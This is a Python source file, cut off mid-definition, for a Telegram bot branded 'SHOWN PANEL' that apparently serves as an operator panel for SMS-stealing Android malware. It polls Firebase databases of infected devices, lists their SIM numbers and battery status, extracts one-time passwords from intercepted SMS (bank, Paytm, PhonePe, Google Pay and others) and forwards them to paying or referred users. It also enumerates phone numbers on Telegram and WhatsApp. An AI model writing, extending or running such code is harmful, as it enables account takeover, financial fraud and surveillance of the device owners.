#!/usr/bin/env python3
"""
══════════════════════════════════════════════════════════════════
   SHOWN PANEL — v19.0 "OSINT MASTER"
   Async SQLite • TG & WA Checkers • FB OSINT • Daily Limits
══════════════════════════════════════════════════════════════════
"""
import os, re, io, csv, json, time, random, asyncio, logging, shutil, sqlite3, tempfile
from datetime import datetime, timezone, date
from typing import Optional, Any, NamedTuple
from collections import defaultdict, OrderedDict, deque
from html import escape

import aiohttp
import aiosqlite
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton, Bot,
)
from telegram.error import Forbidden, RetryAfter, BadRequest, ChatMigrated
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ChatJoinRequestHandler, filters, ContextTypes,
)

# Telethon Imports
try:
    from telethon import TelegramClient
    from telethon.tl.functions.contacts import ImportContactsRequest, DeleteContactsRequest
    from telethon.tl.types import InputPhoneContact
    from telethon.sessions import StringSession
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Playwright Imports
try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# ══════════════════════════════════════════════════════════════════
# CONFIG
# ══════════════════════════════════════════════════════════════════
TOKEN          = os.environ.get("BOT_TOKEN", "")
BOT_USERNAME   = os.environ.get("BOT_USERNAME", "@shownXpannelbot")
DB_FILE        = os.environ.get("DB_FILE", "bot_database.sqlite")
BACKUP_DIR     = os.environ.get("BACKUP_DIR", "backups")
OWNER_HARD_ID  = int(os.environ.get("OWNER_ID", "8984851474"))
OWNER_CONTACT  = os.environ.get("OWNER_CONTACT", "@WhoIsShown")
OWNER_DISPLAY  = os.environ.get("OWNER_NAME", "˹Sʜᴏᴡɴ ꭙ")
BOT_BRAND      = os.environ.get("BOT_BRAND_NAME", "✨ 𝑺𝒉𝒐𝒘𝒏 𝑳𝒆𝒈𝒂𝒄𝒚 ✨")

POLL_INTERVAL  = int(os.environ.get("POLL_INTERVAL", "8"))
DB_CONCURRENCY = int(os.environ.get("DB_CONCURRENCY", "40"))
SEEN_IDS_MAX   = 400_000
SMS_LIMIT      = 15
OTP_DEDUPE_MS  = 300_000
START_TIME     = time.time()

os.makedirs(BACKUP_DIR, exist_ok=True)

logging.basicConfig(format="%(asctime)s [%(levelname)s] %(name)s: %(message)s", level=logging.INFO)
for noisy in ("httpx", "telegram.ext", "aiohttp.access", "aiohttp.client", "telethon", "playwright"):
    logging.getLogger(noisy).setLevel(logging.WARNING)
log = logging.getLogger("panel")

PREMIUM_EMOJIS: dict = {
    "star":    "4958689671950369798", "fire":    "5224607267797606837",
    "check":   "6206479140040743133", "cross":   "5246772116543512028",
    "key":     "4958689671950369798", "phone":   "5404561694510833322",
    "device":  "5253742260054409879", "online":  "5224607267797606837",
    "offline": "6206479140040743133", "backup":  "5440621591387980068",
    "shield":  "6206404510689007446", "rocket":  "5235588635885054955",
    "heart":   "5339233635620899144", "sparkle": "5084613633418199991",
    "book":    "5372849966689566579", "chart":   "5206318837489743801",
    "bell":    "6206446249181189526", "lock":    "5339286072876614251",
    "gem":     "6206174450765796040", "ghost":   "6206497372176913599",
    "upload":  "5440621591387980068", "delete":  "5246772116543512028",
    "add":     "5330115548909349341"
}

SITE_MAP = {
    "google": ("Google","5224607267797606837"), "gmail": ("Gmail","5253742260054409879"),
    "whatsapp": ("WhatsApp","5339233635620899144"), "facebook": ("Facebook","6206497372176913599"),
    "instagram": ("Instagram","6206404510689007446"), "amazon": ("Amazon","5404561694510833322"),
    "flipkart": ("Flipkart","5404561694510833322"), "paytm": ("Paytm","5404561694510833322"),
    "phonepe": ("PhonePe","5404561694510833322"), "gpay": ("Google Pay","5404561694510833322"),
    "telegram": ("Telegram","5253742260054409879"), "twitter": ("Twitter/X","6206497372176913599"),
    "snapchat": ("Snapchat","6206404510689007446"), "netflix": ("Netflix","5372849966689566579"),
    "uber": ("Uber","5372849966689566579"), "ola": ("Ola","5372849966689566579"),
    "swiggy": ("Swiggy","5440621591387980068"), "zomato": ("Zomato","5440621591387980068"),
    "paypal": ("PayPal","5404561694510833322"), "sbi": ("SBI Bank","5404561694510833322"),
    "hdfc": ("HDFC Bank","5404561694510833322"), "icici": ("ICICI Bank","5404561694510833322"),
    "microsoft": ("Microsoft","6204162490515855272"), "apple": ("Apple","6206404510689007446"),
    "discord": ("Discord","6206497372176913599"), "linkedin": ("LinkedIn","6206497372176913599"),
    "truecaller": ("Truecaller","5253742260054409879"),
}

# ══════════════════════════════════════════════════════════════════
# LRU CACHE
# ══════════════════════════════════════════════════════════════════
class SeenCache:
    def __init__(self, maxlen=400_000):
        self.maxlen = maxlen
        self.queue = deque()
        self.seen = set()
    def add(self, key):
        if key in self.seen: return
        self.seen.add(key)
        self.queue.append(key)
        if len(self.seen) > self.maxlen:
            old = self.queue.popleft()
            self.seen.remove(old)
    def __contains__(self, key): return key in self.seen
    def __len__(self): return len(self.seen)

SEEN_IDS = SeenCache()

# ══════════════════════════════════════════════════════════════════
# ASYNC SQLITE DATABASE
# ══════════════════════════════════════════════════════════════════
class Database:
    def __init__(self, path):
        self.path = path
        self.conn: Optional[aiosqlite.Connection] = None

    async def init(self):
        self.conn = await aiosqlite.connect(self.path)
        self.conn.row_factory = aiosqlite.Row
        await self.conn.executescript("""
            CREATE TABLE IF NOT EXISTS users (uid INTEGER PRIMARY KEY, data JSON);
            CREATE TABLE IF NOT EXISTS databases (tag TEXT PRIMARY KEY, url TEXT);
            CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value JSON);
            CREATE TABLE IF NOT EXISTS otp_history (uid INTEGER, ts INTEGER, data JSON);
            CREATE INDEX IF NOT EXISTS idx_otp_uid ON otp_history(uid);
            CREATE TABLE IF NOT EXISTS check_limits (uid INTEGER, date TEXT, platform TEXT, count INTEGER, PRIMARY KEY (uid, date, platform));
        """)
        await self.conn.commit()

    async def get_user(self, uid: int) -> dict:
        async with self.conn.execute("SELECT data FROM users WHERE uid=?", (uid,)) as cur:
            row = await cur.fetchone()
            return json.loads(row["data"]) if row else {}

    async def save_user(self, uid: int, data: dict):
        await self.conn.execute("INSERT OR REPLACE INTO users (uid, data) VALUES (?, ?)", (uid, json.dumps(data)))
        await self.conn.commit()

    async def get_all_users(self) -> dict:
        out = {}
        async with self.conn.execute("SELECT uid, data FROM users") as cur:
            async for row in cur: out[row["uid"]] = json.loads(row["data"])
        return out

    async def get_setting(self, key: str, default=None):
        async with self.conn.execute("SELECT value FROM settings WHERE key=?", (key,)) as cur:
            row = await cur.fetchone()
            return json.loads(row["value"]) if row else default

    async def set_setting(self, key: str, value: Any):
        await self.conn.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, json.dumps(value)))
        await self.conn.commit()

    async def add_db(self, tag: str, url: str):
        await self.conn.execute("INSERT OR REPLACE INTO databases (tag, url) VALUES (?, ?)", (tag, url))
        await self.conn.commit()

    async def remove_db(self, tag: str):
        await self.conn.execute("DELETE FROM databases WHERE tag=?", (tag,))
        await self.conn.commit()

    async def get_all_dbs(self) -> dict:
        out = {}
        async with self.conn.execute("SELECT tag, url FROM databases") as cur:
            async for row in cur: out[row["tag"]] = row["url"]
        return out

    async def log_otp(self, uid, ts, data):
        await self.conn.execute("INSERT INTO otp_history (uid, ts, data) VALUES (?, ?, ?)", (uid, ts, json.dumps(data)))
        await self.conn.commit()

    async def get_otp_history(self, uid, limit=30) -> list:
        out = []
        async with self.conn.execute("SELECT data FROM otp_history WHERE uid=? ORDER BY ts DESC LIMIT ?", (uid, limit)) as cur:
            async for row in cur: out.append(json.loads(row["data"]))
        return out

    async def get_check_count(self, uid: int, platform: str) -> int:
        today = str(date.today())
        async with self.conn.execute("SELECT count FROM check_limits WHERE uid=? AND date=? AND platform=?", (uid, today, platform)) as cur:
            row = await cur.fetchone()
            return row["count"] if row else 0

    async def increment_check_count(self, uid: int, platform: str, amount: int):
        today = str(date.today())
        await self.conn.execute("""
            INSERT INTO check_limits (uid, date, platform, count) VALUES (?, ?, ?, ?)
            ON CONFLICT(uid, date, platform) DO UPDATE SET count = count + ?
        """, (uid, today, platform, amount, amount))
        await self.conn.commit()

    async def close(self):
        if self.conn: await self.conn.close()

db = Database(DB_FILE)

# ══════════════════════════════════════════════════════════════════
# GLOBAL STATE
# ══════════════════════════════════════════════════════════════════
DATABASES: dict = {}
ADMIN_ONLY_TAGS: set = set()
all_users: dict = {}
allowed_users: set = set()
ADMIN_IDS: set = {OWNER_HARD_ID}

FORCE_JOIN_ENABLED = False
FORCE_JOIN_CHANNELS: list = []
GRANT_ACCESS_REQUIRED = True
REFERRAL_ENABLED = True
REQUIRED_REFERRALS = 2

WELCOME_MEDIA: dict = {"file_id": None, "type": "video", "spoiler": False}
ROTATION_MEDIA: list = []
ROTATION_ALWAYS = False
WELCOME_TEXT, HELP_TEXT, SUPPORT_TEXT, MAINTENANCE_TEXT = "", "", "", ""

AUTO_BACKUP_CHAT = 0
AUTO_BACKUP_INTERVAL = 0
AUTO_BACKUP_ENABLED = False
LAST_BACKUP_TS = 0

CLONES: list = []
CLONE_APPS: dict = {}

LIVE_MONITOR = False
LIVE_MONITOR_CHAT = 0
LIVE_MONITOR_ONLY_ADMIN_DEV = True
STORAGE_RETENTION = 20
MAINTENANCE_MODE = False
private_requesters: set = set()

DAILY_TG_LIMIT = 10
DAILY_WA_LIMIT = 10
DAILY_FB_LIMIT = 5

USER_OTP_HISTORY: dict = {}
user_focus: dict = {}
number_seen: dict = {}
welcome_msgs: dict = {}
last_result_msgs: dict = {}
view_stack: dict = {}
user_cooldowns: dict = {}
pending_action: dict = {}

DEVICE_CACHE: dict = {}
_fb_fail: dict = defaultdict(int)
_main_app: Optional[Application] = None

# TELETHON CLIENT
TG_API_ID = 0
TG_API_HASH = ""
tg_client: Optional[TelegramClient] = None

# ══════════════════════════════════════════════════════════════════
# UI HELPERS
# ══════════════════════════════════════════════════════════════════
_SC = str.maketrans("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789")
def sc(s): return str(s).translate(_SC)
def esc(v): return escape(str(v if v is not None else ""))
def em(eid, fb="⭐"): return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'
def pem(name, fb="⭐"): return em(PREMIUM_EMOJIS.get(name), fb) if name in PREMIUM_EMOJIS else fb

def quote(inner, header=""): return f"<blockquote><b>{sc(header)}</b>\n{inner}</blockquote>" if header else f"<blockquote>{inner}</blockquote>"
def premium_text(title, lines, icon=None): return f"<blockquote>{pem(icon, '✨') if icon else ''} <b>{sc(title)}</b>\n\n" + "\n".join(lines) + "</blockquote>"

def ibtn(text, *, cb=None, url=None, copy=None, eid=None, style=None):
    kw = {"text": text}
    if cb: kw["callback_data"] = cb
    if url: kw["url"] = url
    if copy: kw["copy_text"] = copy
    ak = {}
    if eid: ak["icon_custom_emoji_id"] = eid
    if style in ("primary","success","danger"): ak["style"] = style
    if ak: kw["api_kwargs"] = ak
    return InlineKeyboardButton(**kw)

def rbtn(text, eid=None, style="primary"):
    ak = {"style": style}
    if eid: ak["icon_custom_emoji_id"] = eid
    return KeyboardButton(text=text, api_kwargs=ak)

def mask_num(n, admin):
    if admin or not n: return n
    c = re.sub(r"\D", "", n)
    return f"+{c[:2]}{'*' * (len(c) - 5)}{c[-3:]}" if len(c) >= 6 else n

def _norm_num(n):
    c = re.sub(r"\D", "", str(n or ""))
    return c[-10:] if len(c) >= 10 else c

def is_admin(uid): return uid == OWNER_HARD_ID or uid in ADMIN_IDS
def referral_count(uid): return len(set(map(str, all_users.get(uid, {}).get("referrals", []))))

def has_access(uid):
    if is_admin(uid) or uid in allowed_users: return True
    if not GRANT_ACCESS_REQUIRED: return True
    if REFERRAL_ENABLED and referral_count(uid) >= REQUIRED_REFERRALS: return True
    return False

# ══════════════════════════════════════════════════════════════════
# OSINT ENGINES (TG & WA)
# ══════════════════════════════════════════════════════════════════
async def init_telethon():
    global TG_API_ID, TG_API_HASH, tg_client
    if not TELETHON_AVAILABLE: return
    if TG_API_ID and TG_API_HASH:
        try:
            sess_str = await db.get_setting("tg_session", "")
            tg_client = TelegramClient(StringSession(sess_str), TG_API_ID, TG_API_HASH)
            await tg_client.connect()
            if await tg_client.is_user_authorized():
                log.info("Telethon connected successfully.")
            else:
                log.warning("Telethon session invalid.")
                tg_client = None
        except Exception as e:
            log.error(f"Telethon init error: {e}")
            tg_client = None

async def check_tg_numbers(numbers: list[str]) -> str:
    if not tg_client: return "❌ Telegram Account not configured by admin."
    
    contacts = []
    for i, n in enumerate(numbers):
        num = re.sub(r"\D", "", n)
        if num.startswith("0"): num = num[1:]
        if not num.startswith("+"): num = "+" + num
        contacts.append(InputPhoneContact(client_id=i, phone=num, first_name="Check", last_name="Bot"))
        
    try:
        res = await tg_client(ImportContactsRequest(contacts=contacts))
        
        if res.users:
            await tg_client(DeleteContactsRequest(id=res.users))
            
        lines = []
        for imp in res.imported:
            if imp.user_id:
                u = next((x for x in res.users if x.id == imp.user_id), None)
                uname = f"@{u.username}" if u and u.username else "no username"
                lines.append(f"✅ <code>{imp.phone}</code> → {uname} (ID: {imp.user_id})")
            else:
                lines.append(f"❌ <code>{imp.phone}</code> → Not registered")
                
        if not lines:
            return "❌ No results found. Is the session valid?"
        return "\n".join(lines)
    except Exception as e:
        return f"❌ Telethon error: {e}"

async def check_wa_numbers(numbers: list[str]) -> str:
    if not PLAYWRIGHT_AVAILABLE: return "❌ Playwright not installed. Admin needs to run `pip install playwright` and `playwright install chromium`."
    
    async def check_one(page, number):
        num = re.sub(r"\D", "", number)
        if not num.startswith("+"): num = "+" + num
        try:
            await page.goto(f"https://api.whatsapp.com/send?phone={num}", timeout=15000)
            await page.wait_for_timeout(2000)
            content = await page.content()
            if "Phone number shared via url is invalid" in content or "invalid" in content.lower():
                return f"❌ <code>{num}</code> → Not registered"
            else:
                return f"✅ <code>{num}</code> → Registered"
        except Exception:
            return f"⚠️ <code>{num}</code> → Check Failed"

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            pages = [await browser.new_page() for _ in range(5)]
            tasks = [check_one(pages[i % 5], num) for i, num in enumerate(numbers)]
            results = await asyncio.gather(*tasks)
            await browser.close()
            return "\n".join(results)
    except Exception as e:
        return f"❌ Playwright Error: {e}"

# ══════════════════════════════════════════════════════════════════
# OTP ENGINE (UNTOUCHED)
# ══════════════════════════════════════════════════════════════════
class FbClient:
    def __init__(self):
        self._sess: Optional[aiohttp.ClientSession] = None
        self._etag: OrderedDict = OrderedDict()
        self._hits = self._misses = self._requests = 0
    async def close(self):
        if self._sess and not self._sess.closed: await self._sess.close()
    async def _s(self):
        if self._sess is None or self._sess.closed:
            self._sess = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=200, ttl_dns_cache=300, keepalive_timeout=30, enable_cleanup_closed=True), timeout=aiohttp.ClientTimeout(total=8, connect=4), headers={"User-Agent":"PhantomOSINT/19.0"})
        return self._sess
    def _url(self, base, path, shallow=False):
        base = base.rstrip("/")
        u = f"{base}/{path}.json" if path else f"{base}/.json"
        return u + ("?shallow=true" if shallow else "")
    async def get(self, base, path, shallow=False):
        url = self._url(base, path, shallow)
        s = await self._s()
        headers, cached = {}, None if shallow else self._etag.get(url)
        if cached: headers["If-None-Match"] = cached[0]
        try:
            self._requests += 1
            async with s.get(url, headers=headers) as r:
                if r.status == 304 and cached:
                    self._hits += 1; self._etag.move_to_end(url)
                    return cached[1]
                if r.status != 200: return None
                d = await r.json(content_type=None)
                if not shallow:
                    et = r.headers.get("ETag")
                    if et:
                        self._misses += 1
                        self._etag[url] = (et, d); self._etag.move_to_end(url)
                        while len(self._etag) > 5000: self._etag.popitem(last=False)
                return d
        except (aiohttp.ClientError, asyncio.TimeoutError): return None
    @property
    def stats(self):
        tot = self._hits + self._misses
        return {"requests": self._requests, "hits": self._hits, "misses": self._misses, "hit_pct": round(self._hits/tot*100,1) if tot else 0.0, "cache_size": len(self._etag)}

FB = FbClient()

class Device:
    __slots__ = ("id","name","status","battery","timestamp","numbers","sms_path","base_url","tag")
    def __init__(self, **kw):
        for s in self.__slots__: setattr(self, s, kw.get(s))
    @property
    def online(self): return self.status == "online"

def _ts(v):
    try: return float(v or 0)
    except: return 0.0

def _batt(v):
    if isinstance(v, (int,float)): return int(v)
    if isinstance(v, str):
        d = re.sub(r"\D","",v); return int(d) if d else 0
    return 0

def _status(v):
    if v is True: return "online"
    return "online" if str(v).lower() in ("online","true","1","active") else "offline"

def fmt_num(n):
    c = re.sub(r"\D","",str(n or ""))
    if not c: return ""
    if c.startswith("91") and len(c) == 12: return f"+{c}"
    if len(c) == 10: return f"+91{c}"
    if len(c) > 10: return f"+{c}"
    return ""

async def discover(tag, url):
    sim, info, ud, cl = await asyncio.gather(
        FB.get(url, "All_Users/simDetails"), FB.get(url, "All_Users/Data/DeviceInfo"),
        FB.get(url, "user_data"), FB.get(url, "clients"), return_exceptions=True
    )
    out, seen = [], set()
    if isinstance(sim, dict):
        inf = info if isinstance(info, dict) else {}
        for did, s in sim.items():
            if did in seen or not isinstance(s, dict): continue
            seen.add(did)
            i = inf.get(did) or {}
            nums = [n for n in (fmt_num(s.get("sim1Number")), fmt_num(s.get("sim2Number"))) if n]
            model = i.get("DeviceModel") or i.get("Brand") or f"Device-{did[:6]}"
            out.append(Device(id=did, name=model, status=_status(i.get("Status")), battery=_batt(i.get("Battery")), timestamp=int(i.get("currentTimeMillis") or 0), numbers=nums, sms_path=f"All_Users/sms/{did}", base_url=url, tag=tag))
    if isinstance(ud, dict):
        for did, d in ud.items():
            if did in seen or not isinstance(d, dict): continue
            seen.add(did)
            nums = [n for n in (fmt_num(d.get("numberSim1")), fmt_num(d.get("numberSim2")), fmt_num(d.get("mobNo"))) if n]
            out.append(Device(id=did, name=d.get("d_name") or f"Device-{did[:6]}", status=_status(d.get("status")), battery=_batt(d.get("battery")), timestamp=int(d.get("timestamp") or 0), numbers=nums, sms_path=f"user_sms/{did}", base_url=url, tag=tag))
    if isinstance(cl, dict):
        for did, c in cl.items():
            if did in seen or not isinstance(c, dict): continue
            nums = []
            mob = c.get("mobNo")
            if mob: nums.append(fmt_num(mob))
            elif isinstance(c.get("sims"), list) and c["sims"]:
                ph = (c["sims"][0] or {}).get("phoneNumber")
                if ph: nums.append(fmt_num(ph))
            nums = [n for n in nums if n]
            model = c.get("modelName") or f"Device-{did[:6]}"
            if not nums and not c.get("modelName"): continue
            seen.add(did)
            out.append(Device(id=did, name=model, status=_status(c.get("status")), battery=_batt(c.get("battery")), timestamp=0, numbers=nums, sms_path=f"All_Users/sms/{did}", base_url=url, tag=tag))
    try:
        roots = await FB.get(url, "", shallow=True)
        hexes = [k for k in (roots or {}) if len(k) == 16 and re.fullmatch(r"[0-9a-fA-F]{16}", k)]
        if hexes:
            async def _p(k):
                i, s2, hb = await asyncio.gather(FB.get(url, f"{k}/deviceInfo"), FB.get(url, f"{k}/simInfo"), FB.get(url, f"{k}/heartbeat"), return_exceptions=True)
                return k, i, s2, hb
            for k, i, s2, hb in await asyncio.gather(*(_p(k) for k in hexes)):
                if k in seen or not isinstance(i, dict): continue
                seen.add(k)
                nums = []
                if isinstance(s2, dict):
                    for sv in s2.values():
                        if isinstance(sv, dict):
                            n = sv.get("number","")
                            if n and len(re.sub(r"\D","",n)) >= 5: nums.append(fmt_num(n))
                nums = [n for n in nums if n]
                model = i.get("model") or i.get("brand") or f"Device-{k[:6]}"
                try: ts = int(hb) if isinstance(hb, (int,float)) else 0
                except: ts = 0
                st = "online" if ts and (time.time()*1000 - ts) < 300_000 else "offline"
                out.append(Device(id=k, name=model, status=st, battery=0, timestamp=ts, numbers=nums, sms_path=f"{k}/receivedSms", base_url=url, tag=tag))
    except Exception: pass
    return out

def merged_devices(admin):
    out = {}
    for tag, devs in DEVICE_CACHE.items():
        if not admin and tag in ADMIN_ONLY_TAGS: continue
        for d in devs:
            if d.id not in out: out[d.id] = d
    lst = list(out.values())
    lst.sort(key=lambda d: (0 if d.online else 1, 0 if d.numbers else 1, -_ts(d.timestamp)))
    return lst

class Otp(NamedTuple):
    code: str
    confidence: int
    context: str

_PHONE_LIKE = re.compile(r"^[6-9]\d{9}$")
_AMOUNT_LIKE = re.compile(r"^\d+\.\d{2}$")
_OTP_PATTERNS = [
    (re.compile(r"(?:otp|o\.t\.p|one[\s-]?time[\s-]?(?:code|password)|verification\s*code|auth(?:entication)?\s*code|secret\s*code|login\s*code)[^\d\n]{0,20}(\d{4,8})", re.I), 10, "otp keyword"),
    (re.compile(r"\b(?:code|pin|passcode|password)[^\d\n]{0,15}(\d{4,8})", re.I), 8, "code keyword"),
    (re.compile(r"\b(\d{6})\b"), 6, "6-digit"),
    (re.compile(r"\b(\d{4})\b"), 4, "4-digit"),
    (re.compile(r"\b(\d{5})\b"), 4, "5-digit"),
    (re.compile(r"\b(\d{7,8})\b"), 3, "7-8 digit"),
]

def extract_otp(body):
    if not body: return None
    text = str(body)
    for pat, conf, tag in _OTP_PATTERNS:
        for m in pat.finditer(text):
            code = m.group(1)
            if _PHONE_LIKE.match(code) or _AMOUNT_LIKE.match(code): continue
            return Otp(code, conf, text[max(0, m.start()-30):m.end()+30].strip())
    return None

def detect_site(sender, body):
    combined = (str(sender) + " " + str(body)).lower()
    for key, (name, eid) in SITE_MAP.items():
        if key in combined: return name, eid
    s = str(sender or "").strip()
    if s and not s.isdigit() and len(s) >= 3: return s[:20], "5253742260054409879"
    return "Unknown", "5253742260054409879"

def sms_date(sms):
    d = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
    if d: return str(d)
    ts = sms.get("timestamp")
    if ts:
        try:
            t = float(ts); t = t/1000 if t > 1e11 else t
            return datetime.fromtimestamp(t).strftime("%d %b %Y %I:%M %p")
        except Exception: pass
    return "—"

def _body(sms): return sms.get("body") or sms.get("message") or sms.get("text") or ""

async def log_user_otp(uid, number, sender, otp, panel):
    if not uid or not otp: return
    now_ms = int(time.time() * 1000)
    site, eid = detect_site(sender, otp.context)
    data = {"number": str(number), "otp": otp.code, "site": site, "site_eid": eid, "panel": panel, "ts": now_ms}
    await db.log_otp(uid, now_ms, data)

def _sk(dev_id, sms_key): return f"{dev_id}/{sms_key}"

async def forward_otp(bot, cid, dev, sms, otp):
    site, eid = detect_site(sms.get("sender",""), otp.context)
    num = dev.numbers[0] if dev.numbers else dev.name
    ts = int(sms.get("timestamp") or 0)
    try: dt = datetime.fromtimestamp(ts/1000 if ts > 1e11 else ts).strftime("%d %b %Y · %I:%M %p")
    except: dt = sms_date(sms)
    text = premium_text("new otp received", [
        f"{em(eid,'🌐')} <b>{esc(site)}</b>", "",
        f"{pem('key','🔑')} <code>{esc(otp.code)}</code>",
        f"{pem('phone','📞')} <code>{esc(num)}</code>",
        f"{pem('ghost','👤')} from: {esc(str(sms.get('sender','—'))[:30])}",
        f"{pem('chart','📅')} {esc(dt)}",
        f"{pem('fire','🔥')} <code>{esc(dev.tag)}</code>", "",
        f"{pem('book','💬')} {esc(_body(sms)[:300])}",
    ], icon="key")
    kb = InlineKeyboardMarkup([[
        ibtn(f"🔑 Copy {otp.code}", copy=otp.code, eid=PREMIUM_EMOJIS.get("key"), style="success"),
        ibtn("🔕 Stop", cb=f"uw:{dev.id}", eid=PREMIUM_EMOJIS.get("cross"), style="danger"),
    ]])
    try:
        await bot.send_message(cid, text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)
        await log_user_otp(cid, num, sms.get("sender","—"), otp, dev.tag)
    except Exception as e: log.debug(f"forward {cid}: {e}")

async def send_live(bot, chat_id, dev, sms, otp):
    site, eid = detect_site(sms.get("sender",""), otp.context)
    num = dev.numbers[0] if dev.numbers else dev.name
    ts = int(sms.get("timestamp") or 0)
    try: dt = datetime.fromtimestamp(ts/1000 if ts > 1e11 else ts).strftime("%d %b %Y · %I:%M %p")
    except: dt = sms_date(sms)
    text = premium_text("live otp feed", [
        f"{em(eid,'🌐')} <b>{esc(site)}</b>", "",
        f"{pem('key','🔑')} <code>{esc(otp.code)}</code>",
        f"{pem('phone','📞')} <code>{esc(num)}</code>",
        f"{pem('fire','🔥')} <code>{esc(dev.tag)}</code>",
        f"{pem('chart','📅')} {esc(dt)}", "",
        f"{pem('book','💬')} {esc(_body(sms)[:300])}",
    ], icon="key")
    kb = InlineKeyboardMarkup([[
        ibtn(f"🔑 Copy {otp.code}", copy=otp.code, eid=PREMIUM_EMOJIS.get("key"), style="success"),
    ]])
    await bot.send_message(chat_id, text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)

async def dispatch(dev, sms, app):
    otp = extract_otp(_body(sms))
    if not otp: return
    admin_dev = dev.tag in ADMIN_ONLY_TAGS
    for cid, dev_id in list(user_focus.items()):
        if dev_id != dev.id: continue
        u = all_users.get(cid) or {}
        if u.get("banned"): continue
        if not has_access(cid): continue
        if admin_dev and not is_admin(cid): continue
        await forward_otp(app.bot, cid, dev, sms, otp)
    if LIVE_MONITOR and LIVE_MONITOR_CHAT:
        if not LIVE_MONITOR_ONLY_ADMIN_DEV or admin_dev:
            try: await send_live(app.bot, LIVE_MONITOR_CHAT, dev, sms, otp)
            except Exception as e: log.debug(f"live: {e}")

async def seed_seen(tag, url):
    try:
        m, u = await asyncio.gather(FB.get(url, "All_Users/sms", shallow=True), FB.get(url, "user_sms", shallow=True), return_exceptions=True)
        for bulk in (m, u):
            if isinstance(bulk, dict):
                for did, km in bulk.items():
                    if isinstance(km, dict):
                        for k in km: SEEN_IDS.add(_sk(did, k))
    except Exception: pass

async def poll_one(tag, url, app, sem):
    async with sem:
        try:
            m, u = await asyncio.gather(FB.get(url, "All_Users/sms", shallow=True), FB.get(url, "user_sms", shallow=True), return_exceptions=True)
            dev_map = {d.id: d for d in DEVICE_CACHE.get(tag, [])}
            for bulk, root in ((m, "All_Users/sms"), (u, "user_sms")):
                if not isinstance(bulk, dict): continue
                for did, km in bulk.items():
                    if not isinstance(km, dict): continue
                    dev = dev_map.get(did)
                    if not dev: continue
                    new = [k for k in km if _sk(did, k) not in SEEN_IDS]
                    for k in new[:20]:
                        SEEN_IDS.add(_sk(did, k))
                        sms = await FB.get(url, f"{root}/{did}/{k}")
                        if isinstance(sms, dict):
                            try: await dispatch(dev, sms, app)
                            except Exception as e: log.debug(f"disp {did}/{k}: {e}")
        except Exception as e: log.warning(f"poll {tag}: {e}")

async def refresh_devs(tag, url, sem):
    async with sem:
        try:
            devs = await discover(tag, url)
            DEVICE_CACHE[tag] = devs or []
            _fb_fail[tag] = 0
        except Exception as e:
            _fb_fail[tag] += 1
            log.warning(f"refresh {tag}: {e}")

async def poll_loop(app):
    sem = asyncio.Semaphore(DB_CONCURRENCY)
    first = True
    while True:
        t0 = time.time()
        try:
            items = list(DATABASES.items())
            await asyncio.gather(*(refresh_devs(t, u, sem) for t, u in items))
            if first:
                await asyncio.gather(*(seed_seen(t, u) for t, u in items))
                first = False
                log.info(f"OTP engine online — {len(SEEN_IDS)} seeded")
            else:
                await asyncio.gather(*(poll_one(t, u, app, sem) for t, u in items))
        except asyncio.CancelledError: return
        except Exception as e: log.error(f"poll: {e}")
        await asyncio.sleep(max(1, POLL_INTERVAL - (time.time() - t0)))

# ══════════════════════════════════════════════════════════════════
# KEYBOARDS
# ══════════════════════════════════════════════════════════════════
def kb_main(admin):
    rows = [
        [rbtn(sc("Devices List"), PREMIUM_EMOJIS.get("device")), rbtn(sc("All Panels"), PREMIUM_EMOJIS.get("book"))],
        [rbtn(sc("Search Number"), PREMIUM_EMOJIS.get("phone")), rbtn(sc("TG Checker"), PREMIUM_EMOJIS.get("ghost"))],
        [rbtn(sc("WA Checker"), PREMIUM_EMOJIS.get("ghost")), rbtn(sc("FB OSINT"), PREMIUM_EMOJIS.get("fire"))],
        [rbtn(sc("Recent OTPs"), PREMIUM_EMOJIS.get("key"), "success"), rbtn(sc("Panel Status"), PREMIUM_EMOJIS.get("chart"), "success")],
        [rbtn(sc("User Hub"), PREMIUM_EMOJIS.get("heart")), rbtn(sc("My Profile"), PREMIUM_EMOJIS.get("ghost"))],
    ]
    if admin: rows.append([rbtn(sc("Admin Panel"), PREMIUM_EMOJIS.get("shield"), "danger"), rbtn(sc("Ping"), PREMIUM_EMOJIS.get("check"), "success")])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)

def kb_user_hub():
    return ReplyKeyboardMarkup([
        [rbtn(sc("My Profile"), PREMIUM_EMOJIS.get("ghost")), rbtn(sc("My OTPs"), PREMIUM_EMOJIS.get("key"), "success")],
        [rbtn(sc("My Referrals"), PREMIUM_EMOJIS.get("sparkle")), rbtn(sc("Support"), PREMIUM_EMOJIS.get("heart"))],
        [rbtn(sc("Help"), PREMIUM_EMOJIS.get("book")), rbtn(sc("Main Menu"), PREMIUM_EMOJIS.get("star"))],
    ], resize_keyboard=True)

def kb_admin_menu():
    return InlineKeyboardMarkup([
        [ibtn(sc("Databases"), cb="admin:databases", style="primary", eid=PREMIUM_EMOJIS.get("book")), ibtn(sc("Users & Access"), cb="admin:users", style="primary", eid=PREMIUM_EMOJIS.get("shield"))],
        [ibtn(sc("Premium Emojis"), cb="admin:emojis", style="primary", eid=PREMIUM_EMOJIS.get("sparkle")), ibtn(sc("Live Monitor"), cb="admin:live", style="primary", eid=PREMIUM_EMOJIS.get("device"))],
